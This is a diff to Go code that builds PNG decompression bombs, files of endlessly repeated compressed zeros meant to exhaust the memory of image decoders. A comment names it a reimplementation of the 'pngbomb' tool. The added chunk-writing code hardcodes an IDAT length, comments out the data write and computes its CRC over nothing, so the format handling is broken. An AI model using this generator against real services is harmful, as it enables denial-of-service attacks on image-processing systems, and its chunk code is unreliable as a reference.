@@ -146,10 +146,49 @@ func (p *pool) Put(b *png.EncoderBuffer) {
 	p.b = b
 }
 
+func writeChunkStart(w io.Writer, b []byte, name string) (err error) {
+	header := make([]byte, 8)
+	n := uint32(len(b))
+	binary.BigEndian.PutUint32(header[:4], n)
+	header[4] = name[0]
+	header[5] = name[1]
+	header[6] = name[2]
+	header[7] = name[3]
+	crc := crc32.NewIEEE()
+	crc.Write(header[4:8])
+	crc.Write(b)
+
+	_, err = w.Write(header[:8])
+	if err != nil {
+		return err
+	}
+	/*
+		_, err = w.Write(b)
+		if err != nil {
+			return err
+		}
+	*/
+	return
+}
+
+func writeChunkEnd(w io.Writer) (err error) {
+	footer := make([]byte, 4)
+	crc := crc32.NewIEEE()
+	binary.BigEndian.PutUint32(footer[:4], crc.Sum32())
+	_, err = w.Write(footer[:4])
+	return err
+}
+
 /*
 Reimplementation of https://github.com/liclac/pngbomb/blob/f0fc2f2a42784557727e44be2f1b86844759a6fa/src/main.rs#L128-L151
 */
 func writePayload(width int, height int, w io.Writer) (err error) {
+	b := make([]byte, 1213197)
+	err = writeChunkStart(w, b, "IDAT")
+	if err != nil {
+		return err
+	}
+
 	// PNG bitmap data is grouped in "scanlines", eg. data for one horizontal line, prefixed with
 	// a 1-byte filter mode flag. We're using no filters (0) and all-black (0) pixels, we just want
 	// to generate a whole pile of deflated zeroes, but without allocating it all upfront.
@@ -191,6 +230,11 @@ func writePayload(width int, height int, w io.Writer) (err error) {
 		}
 		at += n
 	}
+
+	err = writeChunkEnd(w)
+	if err != nil {
+		return err
+	}
 	return
 }
 
@@ -204,12 +248,10 @@ func generatePNG(width int, height int, w io.Writer) error {
 
 	io.WriteString(w, pngHeader)
 	e.writeIHDR()
-
 	err := writePayload(width, height, w)
 	if err != nil {
 		return fmt.Errorf("unable to write payload: %v", err)
 	}
-	e.writeIDATs()
 	e.writeIEND()
 
 	return nil
